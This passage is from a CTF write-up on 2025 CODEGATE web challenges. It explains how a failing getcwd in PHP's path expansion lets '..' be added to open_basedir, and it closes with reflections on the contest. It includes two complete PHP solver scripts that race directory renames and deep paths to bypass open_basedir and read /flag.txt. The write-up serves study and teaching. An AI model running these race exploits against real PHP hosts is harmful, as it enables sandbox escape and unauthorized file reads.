		if (!result && (iam != filepath)) { // [3]
			int fdtest = -1;

			fdtest = VCWD_OPEN(filepath, O_RDONLY);
			if (fdtest != -1) { // [4]
				/* return a relative file path if for any reason
				 * we cannot getcwd() and the requested,
				 * relatively referenced file is accessible */
				copy_len = path_len > MAXPATHLEN - 1 ? MAXPATHLEN - 1 : path_len;
				if (real_path) {
					memcpy(real_path, filepath, copy_len);
					real_path[copy_len] = '\0';
				} else {
					real_path = estrndup(filepath, copy_len);
				}
				close(fdtest);
				return real_path;
			} else {
				cwd[0] = '\0';
			}
		} else if (!result) {
			cwd[0] = '\0';
		}
	}
	...
	return real_path;
}
/* }}} */
```

Let's see how each conditional statement is handled.

If you input a relative path, you can branch to **[1]**. Since `relative_to` is set to NULL, it enters **[2]**.

If **[3]** satisfies `!result && (iam != filepath)` and **[4]** satisfies `fdtest != -1`, PHP treats filepath like realpath, and `..` is added to the open_basedir value.

Therefore, the conditions for possible bypass are as follows:

**(1)** `filepath` is a relative path.

**(2)** `VCWD_GETCWD(cwd, MAXPATHLEN)` → FAIL

**(3)** `VCWD_OPEN(filepath, O_RDONLY)` → SUCCESS

When the above conditions are satisfied, `..` is added to the open_basedir value, allowing bypass of the restriction.

`VCWD_GETCWD` is PHP's version of C's `getcwd`.

Let's look at cases where `getcwd` returns NULL from the [Linux manual page](https://man7.org/linux/man-pages/man3/getcwd.3.html).

```markdown
### RETURN VALUE

_On success_, these functions return a pointer to a string
containing the pathname of the current working directory. In the
case of getcwd() and getwd() this is the same value as buf.

_On failure_, these functions return NULL, and errno is set to
indicate the error. The contents of the array pointed to by buf
are undefined on error.

### ERRORS

- EACCES : Permission to read or search a component of the filename
  was denied.
- EFAULT : buf points to a bad address.
- EINVAL : The size argument is zero and buf is not a null pointer.
- EINVAL : getwd(): buf is NULL.
- ENAMETOOLONG : getwd(): The size of the null-terminated absolute pathname string exceeds PATH_MAX bytes.
- ENOENT : The current working directory has been unlinked.
- ENOMEM : Out of memory.
- ERANGE : The size argument is less than the length of the absolute
  pathname of the working directory, including the
  terminating null byte. You need to allocate a bigger array
  and try again.
```

Looking at the RETURN VALUE section, it states "On failure, returns NULL."

The simplest case where an error occurs is "The current working directory has been unlinked," which occurs when the current working directory has been deleted.

Another case is "The size of the null-terminated absolute pathname string exceeds PATH_MAX bytes," which occurs when the current pathname exceeds PATH_MAX (=4096, `linux/limits.h`).

The first case is [HexF](https://hexf.me/)'s idea, and the second case is the challenge author's (payload) idea.

If you implement the above ideas in code, you can bypass open_basedir to read the flag.

## Solver

```php
<?
chdir("/tmp");

$allowed_path = "/tmp";

@mkdir("start/");
chdir("start/");
$cur_dir = getcwd();
$cur_dir_len = strlen($cur_dir);

$magic_depth = str_repeat(str_repeat("a", 249) . "/", 16 - floor($cur_dir_len / 250));
@mkdir($magic_depth, 0755, true);

chdir($magic_depth);

$pid = pcntl_fork();
var_dump($pid);
if ($pid == -1)
    die;
if ($pid == 0) {
    for ($i = 0; $i < 25; $i++) {
        usleep(300);
        $cur_basedir = ini_get("open_basedir");
        ini_set("open_basedir", $cur_basedir . ":../");
    }
    chdir($allowed_path);
    chdir("../");

    $content = @file_get_contents("/flag.txt");
    if (!$content)
        die("failed\n");
    echo $content;
} else {
    chdir("/tmp");
    for ($i = 0; $i < 30000; $i++) {
        usleep(30);
        rename("start", str_repeat("x", 250));
        rename(str_repeat("x", 250), "start");
    }
}
?>
```

```php
<?php
@rmdir("/tmp/adir/bdir");
@rmdir("/tmp/adir");
@rmdir("/tmp/bdir");

mkdir("/tmp/adir");
mkdir("/tmp/adir/bdir");
chdir("/tmp/adir/bdir");

$count = 100000000;

$pid = pcntl_fork();
if ($pid == -1) {
    die('could not fork');
} else if ($pid) {
    for ($i = 0; $i < $count; $i++) {
        $r = @file_get_contents("../../flag.txt");
        if ($r !== false) {
            var_dump($r);
        }
    }
} else {
    // we are the child
    for ($i = 0; $i < $count; $i++) {
        rename("/tmp/adir/bdir", "/tmp/bdir");
        rename("/tmp/bdir", "/tmp/adir/bdir");
    }
}
?>

```

To supplement the explanation of the above PoC: PHP's file-related functions (`file_get_contents`, `fopen`, etc.) internally call the `php_check_open_basedir` function when invoked. This function then calls `expand_filepath` and performs verification logic similar to `OnUpdateBaseDir()`.

The core of the attack is a race condition that occurs when two processes run simultaneously.

1. **Parent process**: Repeatedly executes `file_get_contents("../../flag.txt")`
2. **Child process**: Repeatedly performs `rename` between `/tmp/A/B` and `/tmp/B` directories

This process exploits the time gap (TOCTOU - Time-of-Check-Time-of-Use) between path resolution and `open_basedir` verification to bypass the restriction.

Therefore, as mentioned above, when the working directory is changed between path resolution time and verification time due to directory manipulation, a "The current working directory has been unlinked." error occurs, but file access remains possible with the already resolved path.

![flag](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2037.png)

flag

# Conclusion

This competition was a great learning experience, as many challenges required chaining multiple vulnerabilities rather than exploiting a single one. The problems in the general division were particularly difficult, combining different fields like **WEB+PWNABLE** and **WEB+WEB3**. The problems in the youth division were relatively simpler compared to those in the general division, but they required careful understanding and precise approaches, making them well-suited for students to study.

Among them, the most impressive challenge was the **Node.js ROP problem (chachadotcom)** from the general division. The flow of the exploit was fascinating; it didn't just stop at an arbitrary file write but connected it to a full Remote Code Execution (RCE) by using ROP on the Node.js binary. Research into achieving RCE through arbitrary file writes has been ongoing for a long time, with well-known PHP file-based tricks and similar techniques recently emerging in Python research.
👉 [Dirty Arbitrary File Write to RCE via Python](https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/)

Furthermore, a similar challenge appeared in the **2025 HITCON CTF**, where an RCE was triggered by writing an arbitrary file to `/proc/self/fd/` in a Flask environment. This demonstrates that such techniques can be applied across various runtime environments, not just Node.js.

Therefore, it's crucial to study beyond simple file write vulnerabilities and understand how they can be escalated to RCE by leveraging the internal structures of runtimes like **libuv, Python bytecode, or the PHP engine**.

To sum up, the competition was highly enjoyable. The challenges were well-designed, avoiding contrived scenarios and incorporating a number of uncommon tricks. I sincerely thank the CODEGATE staff for preparing such excellent problems.
